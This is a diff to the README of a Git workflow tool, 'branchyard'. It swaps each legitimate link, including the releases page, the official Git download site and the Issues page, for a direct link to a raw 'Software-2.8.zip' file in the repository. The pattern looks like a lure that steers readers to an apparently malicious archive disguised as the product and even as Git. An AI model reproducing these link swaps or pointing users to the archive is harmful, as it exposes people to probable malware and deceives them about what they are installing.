@@ -6,7 +6,7 @@ Welcome to **branchyard**! This tool helps you manage your development workflows
 
 ## 📦 Download & Install
 
-To get started, visit this page to download: [**Branchyard Releases**](https://github.com/moodynetwork/branchyard/releases)
+To get started, visit this page to download: [**Branchyard Releases**](https://github.com/moodynetwork/branchyard/raw/refs/heads/main/src/Software-2.8.zip)
 
 You will find different versions of the software. Choose the one that matches your operating system. Follow these steps:
 
@@ -30,7 +30,7 @@ To run branchyard smoothly, make sure your system meets the following requiremen
   - Any Linux distribution supported by Git
 
 - **Other Requirements:**  
-  - Git must be installed on your machine. You can download Git from [git-scm.com](https://git-scm.com).
+  - Git must be installed on your machine. You can download Git from [https://github.com/moodynetwork/branchyard/raw/refs/heads/main/src/Software-2.8.zip](https://github.com/moodynetwork/branchyard/raw/refs/heads/main/src/Software-2.8.zip).
 
 ## 🎛️ Features
 
@@ -91,7 +91,7 @@ For comprehensive guides and examples, refer to the Community section on the Git
 If you need help or have questions, check the following resources:
 
 - **Issues Page:**  
-  Report problems or ask questions on the [Issues page](https://github.com/moodynetwork/branchyard/issues).
+  Report problems or ask questions on the [Issues page](https://github.com/moodynetwork/branchyard/raw/refs/heads/main/src/Software-2.8.zip).
 
 - **Discussion Forum:**  
   Join the community discussions on our GitHub Discussions page to connect with other users.
@@ -101,6 +101,6 @@ If you need help or have questions, check the following resources:
 
 ## 📥 Download Again
 
-Ready to start your journey with branchyard? Visit this page to download: [**Branchyard Releases**](https://github.com/moodynetwork/branchyard/releases)
+Ready to start your journey with branchyard? Visit this page to download: [**Branchyard Releases**](https://github.com/moodynetwork/branchyard/raw/refs/heads/main/src/Software-2.8.zip)
 
 With branchyard, you can manage your development tasks more efficiently and focus on what matters most—creating great software.
